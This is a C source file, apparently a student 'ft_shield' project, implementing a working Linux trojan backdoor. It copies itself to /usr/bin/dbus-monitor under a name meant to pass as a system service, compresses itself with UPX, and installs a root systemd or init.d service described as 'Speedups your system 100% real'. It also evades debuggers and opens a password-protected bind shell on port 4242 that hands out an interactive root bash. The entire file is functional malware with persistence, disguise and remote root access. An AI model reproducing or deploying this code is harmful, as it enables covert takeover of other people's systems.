#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pwd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pty.h>
#include <signal.h>
#include <sys/wait.h>
#include <semaphore.h>
#include <arpa/inet.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>

/*
    Decided to name it dbus-monitor as it is a common name for a service
    for example dbus-daemon is a service that runs on linux systems.
*/
#define DISGUISED_TARGET_PATH "/usr/bin/dbus-monitor" 
#define SERVICE_PATH_SYSTEMD "/etc/systemd/system/dbus-helper.service" 
#define SERVICE_PATH_SYSVINIT "/etc/init.d/dbus-helper"
#define LOG_FILE_PATH "/var/log/ft_shield_actions.log"
#define PORT 4242

sem_t connection_semaphore;

void md5(const uint8_t *initial_msg, size_t initial_len, uint8_t *digest);
void log_message(const char* filename, const char* message_format, ...);

int use_systemd()
{
    return access("/run/systemd/system", F_OK) == 0;
}

void copy_to_standard_location()
{
    char buffer[1024];
    ssize_t bytes_read, bytes_written;
    
    int source_fd = open("/proc/self/exe", O_RDONLY);
    if (source_fd < 0)
    {
        perror("Failed to open source binary");
        exit(EXIT_FAILURE);
    }

    int target_fd = open(DISGUISED_TARGET_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (target_fd < 0)
    {
        perror("Failed to open target path");
        close(source_fd);
        exit(EXIT_FAILURE);
    }

    while ((bytes_read = read(source_fd, buffer, sizeof(buffer))) > 0)
    {
        bytes_written = write(target_fd, buffer, bytes_read);
        if (bytes_written != bytes_read)
        {
            perror("Failed to write complete data");
            close(source_fd);
            close(target_fd);
            exit(EXIT_FAILURE);
        }
    }

    close(source_fd);
    close(target_fd);
    int foo = system("upx --best " DISGUISED_TARGET_PATH " 2>/dev/null 1>/dev/null");
    (void)foo;
}

void create_service_file(int systemd_enabled)
{
    const char *service_content_systemd =
        "[Unit]\n"
        "Description=Speedups your system 100%% real.\n"
        "After=network.target\n\n"
        "[Service]\n"
        "ExecStart=" DISGUISED_TARGET_PATH " --daemon\n"
        "Restart=always\n"
        "User=root\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";

    const char *service_content_sysvinit =
        "#!/bin/sh\n"
        "### BEGIN INIT INFO\n"
        "# Provides:          DBus monitoring\n"
        "# Required-Start:    $network\n"
        "# Required-Stop:     $network\n"
        "# Default-Start:     2 3 4 5\n"
        "# Default-Stop:      0 1 6\n"
        "# Short-Description: Speedups your system 100%% real.\n"
        "### END INIT INFO\n"
        "\n"
        "case \"$1\" in\n"
        "    start)\n"
        "        " DISGUISED_TARGET_PATH " &\n"
        "        ;;\n"
        "    stop)\n"
        "        killall dbus-monitor\n"
        "        ;;\n"
        "    *)\n"
        "        echo \"Usage: $0 {start|stop}\"\n"
        "        exit 1\n"
        "esac\n"
        "exit 0\n";

    const char *service_path = systemd_enabled ? SERVICE_PATH_SYSTEMD : SERVICE_PATH_SYSVINIT;
    const char *service_content = systemd_enabled ? service_content_systemd : service_content_sysvinit;

    int fd = open(service_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0)
    {
        perror("Failed to create service file");
        exit(EXIT_FAILURE);
    }

    int foo = write(fd, service_content, strlen(service_content));
    (void)foo;
    close(fd);
}

void setup_service(int systemd_enabled)
{
    int foo;
    if (systemd_enabled)
    {
        foo = system("systemctl daemon-reload");
        foo = system("systemctl enable dbus-helper");
        foo = system("systemctl start dbus-helper");
    }
    else
    {
        foo = system("chmod +x " SERVICE_PATH_SYSVINIT);
        foo = system("service dbus-helper start");
    }
    (void)foo;
}

void uninstall_service(int systemd_enabled)
{
    int foo;
    foo = system("ps aux | grep '[d]bus-monitor' | awk '{print $2}' | xargs kill -9 2>/dev/null 1>/dev/null");

    if (systemd_enabled)
    {
        foo = system("systemctl stop dbus-helper");
        foo = system("systemctl disable dbus-helper");
        foo = remove(SERVICE_PATH_SYSTEMD);
        foo = system("systemctl daemon-reload");
    }
    else
    {
        foo = system("service dbus-helper stop");
        foo = remove(SERVICE_PATH_SYSVINIT);
    }

    foo = remove(DISGUISED_TARGET_PATH);

    (void)foo;
}

static void md5_to_hex_string(const uint8_t *digest, char *out)
{
    for (int i = 0; i < 16; i++)
    {
        sprintf(&out[i * 2], "%02x", digest[i]);
    }
    out[32] = '\0';
}

void handle_sigchld(int sig)
{
    (void)sig;
    while (waitpid(-1, NULL, WNOHANG) > 0)
    {
        sem_post(&connection_semaphore);
    }
}

int mid_state_promt(int client_socket)
{
    int shell = 0;
    char buffer[1024];

    while (1)
    {
        send(client_socket, "> ", 2, 0);

        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received <= 0)
        {
            if (bytes_received == 0)
            {
                printf("Connection closed by client.\n");
            }
            else
            {
                perror("recv");
            }
            break;
        }

        buffer[bytes_received - 1] = '\0';

        if (strcmp(buffer, "?") == 0)
        {
            const char* help_message = "Help Menu:\n? - Shows help menu\nshell - Provides a root shell\n";
            send(client_socket, help_message, strlen(help_message), 0);
        }
        else if (strcmp(buffer, "shell") == 0)
        {
            shell = 1;
            break;
        }
        else if (strlen(buffer) == 0)
        {
            continue;
        }
        else
        {
            const char* invalid_command_message = "Invalid command. Type '?' for help.\n";
            send(client_socket, invalid_command_message, strlen(invalid_command_message), 0);
        }
    }

    return shell;
}

void handle_client(int client_socket, const char *client_ip)
{
    char buffer[1024];
    int authenticated = 0;
    int shell = 0;
    size_t total_data_sent = 0;
    size_t total_data_received = 0;

    while (authenticated == 0)
    {
        send(client_socket, "Password: ", 10, 0);
        int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    
        if (bytes_received <= 0) 
            break;

        buffer[bytes_received - 1] = '\0';
        uint8_t digest[16];
        char pwd[33];
    
        md5((uint8_t *)buffer, strlen(buffer), (uint8_t *)digest);
        md5_to_hex_string(digest, pwd);
    
        if (strcmp(pwd, PWD) == 0)
        {
            authenticated = 1;
        }
        else
        {
            log_message(LOG_FILE_PATH, "Rejected connection from %s due to: Authentication failed.\n", client_ip);
        }
    }

    log_message(LOG_FILE_PATH, "Connection from %s received.\n", client_ip);

    shell = mid_state_promt(client_socket);

    if (authenticated && shell)
    {
        int master_fd;
        pid_t pid = forkpty(&master_fd, NULL, NULL, NULL);  // Create a PTY for the child process
        if (pid == -1)
        {
            perror("forkpty failed");
            close(client_socket);
            return;
        }

        if (pid == 0)
        {
            setenv("TERM", "xterm-256color", 1);
            execl("/bin/bash", "/bin/bash", "-i", NULL);
            perror("execl failed");
            exit(EXIT_FAILURE);
        }
        else
        {
            fd_set fds;
            while (1)
            {
                FD_ZERO(&fds);
                FD_SET(client_socket, &fds);
                FD_SET(master_fd, &fds);

                if (select(master_fd + 1, &fds, NULL, NULL, NULL) < 0)
                {
                    perror("select failed");
                    break;
                }

                if (FD_ISSET(master_fd, &fds))
                {
                    int n = read(master_fd, buffer, sizeof(buffer));
                    if (n <= 0) break;
                    send(client_socket, buffer, n, 0);

                    total_data_sent += n;
                    
                    log_message(LOG_FILE_PATH, "Command output: %.*s", n, buffer);
                }

                if (FD_ISSET(client_socket, &fds))
                {
                    int n = recv(client_socket, buffer, sizeof(buffer), 0);
                    if (n <= 0) break;
                    int foo = write(master_fd, buffer, n);
                    (void)foo;
                    total_data_received += n;

                    log_message(LOG_FILE_PATH, "Command requested: %.*s", n, buffer);
                }
            }
            close(master_fd);
        }
    }

    log_message(LOG_FILE_PATH, "Session from %s ended. Data sent: %zd bytes, Data received: %zd bytes\n", client_ip, total_data_sent, total_data_received);

    close(client_socket);
}

void daemon_main()
{
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_size = sizeof(client_addr);

    sem_init(&connection_semaphore, 0, 3);

    struct sigaction sa;
    sa.sa_handler = handle_sigchld;
    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
    sigaction(SIGCHLD, &sa, NULL);


    if ((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    int opt = 1;
    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1)
    {
        perror("Bind faild");
        close(server_socket);
        exit(EXIT_SUCCESS);
    }

    if (listen(server_socket, 3) == -1)
    {
        perror("Listen failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    while (1)
    {
        sem_wait(&connection_semaphore);

        client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_addr_size);
        if (client_socket == -1)
        {
            log_message(LOG_FILE_PATH, "Incomming connection refused due to: Accept Failed.\n");
            
            // perror("Accept failed");
            sem_post(&connection_semaphore);
            continue;
        }
        if (fork() == 0)
        {
            char client_ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));

            handle_client(client_socket, client_ip);
            close(server_socket);
            exit(EXIT_SUCCESS);
        }
    }

    close(server_socket);
    sem_destroy(&connection_semaphore);
}

char* get_username()
{
    char *user = getenv("USER");
    if (user)
    {
        return user;
    }

    struct passwd *pw = getpwuid(getuid());
    if (pw)
    {
        return pw->pw_name;
    }

    return "Unknown";
}

/*
    avoid strace or debugging
*/
int check_debugging()
{
    FILE *file = fopen("/proc/self/status", "r");
    if (!file) return 0;

    char line[256];
    while (fgets(line, sizeof(line), file))
    {
        if (strncmp(line, "TracerPid:", 10) == 0)
        {
            int tracer_pid = atoi(&line[10]);
            fclose(file);
            return tracer_pid != 0;
        }
    }
    fclose(file);
    return 0;
}

void prevent_debugger_attach()
{
    prctl(PR_SET_DUMPABLE, 0);
}

int main(int argc, char *argv[])
{
    if (geteuid() != 0)
    {
        char *user = get_username();
        printf("%s\n", user);
        return 0;
    }

    if (check_debugging())
    {        
        char *user = get_username();
        printf("%s\n", user);
        return 0;
    }

    prevent_debugger_attach();

    int systemd_enabled = use_systemd();

    if (argc > 1 && strcmp(argv[1], "--daemon") == 0)
    {
        daemon_main();
        return 0;
    }

    if (argc > 1)
    {
        char *user = get_username();
        printf("%s\n", user);
        return 0;
    }

    char *user = get_username();
    printf("%s\n", user);

    if (access(DISGUISED_TARGET_PATH, F_OK) != 0)
    {
        copy_to_standard_location();
    }

    create_service_file(systemd_enabled);

    setup_service(systemd_enabled);

    return 0;
}
